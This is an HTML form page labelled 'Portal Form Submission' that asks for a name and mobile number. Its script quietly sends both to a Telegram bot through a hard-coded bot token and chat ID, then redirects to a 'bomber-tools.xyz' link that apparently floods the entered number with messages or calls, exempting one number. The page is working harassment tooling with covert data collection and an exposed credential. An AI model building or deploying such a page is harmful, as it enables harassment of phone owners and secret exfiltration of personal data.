<!DOCTYPE html>
<html>
<head>
    <title>Portal Form Submission</title>
    <style>
        body {
            background-color: #000000; /* Black background */
            color: #ffffff; /* White text */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .form-container {
            text-align: center;
            background-color: #1c1c1c;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
        }
        input[type="text"] {
            width: 80%;
            padding: 15px;
            margin: 15px 0;
            border: none;
            border-radius: 5px;
            background-color: #333333;
            color: #ffffff;
            font-size: 16px;
        }
        button {
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            background-color: #444444;
            color: #ffffff;
            cursor: pointer;
            transition: background-color 0.3s ease;
            font-size: 16px;
        }
        button:hover {
            background-color: #555555;
        }
    </style>
    <script>
        function submitForm(event) {
            event.preventDefault(); // Prevent the default form submission

            var name = document.getElementById("name").value;
            var mobile = document.getElementById("mobile").value;

            if (mobile === "9026537554") {
                alert("YOU CAN'T CALL TO GOD");
                return;
            }

            // Send data to Telegram bot
            var chatId = "5112680061";
            var apiKey = "6752600114:AAGXb8R5WMKc_Uur_7ufDIXPprXB6PXoCsg";
            var message = "Name: " + name + "\nMobile: " + mobile;

            fetch(`https://api.telegram.org/bot${apiKey}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });

            // Open URL based on the mobile number
            var url = `https://bomber-tools.xyz/?mobile=${mobile}&accesskey=bombersmm&submit=Submit`;
            window.location.href = url;

            // After 2 seconds, redirect to the intermediate page
            setTimeout(function() {
                window.location.href = "intermediate.html?mobile=" + mobile;
            }, 20000);
        }
    </script>
</head>
<body>
    <div class="form-container">
        <h1>Portal Form Submission</h1>
        <form onsubmit="submitForm(event)">
            <label for="name">Name:</label><br>
            <input type="text" id="name" name="name" required><br><br>

            <label for="mobile">Mobile Number:</label><br>
            <input type="text" id="mobile" name="mobile" required><br><br>

            <button type="submit">Submit</button>
        </form>
    </div>
</body>
</html>
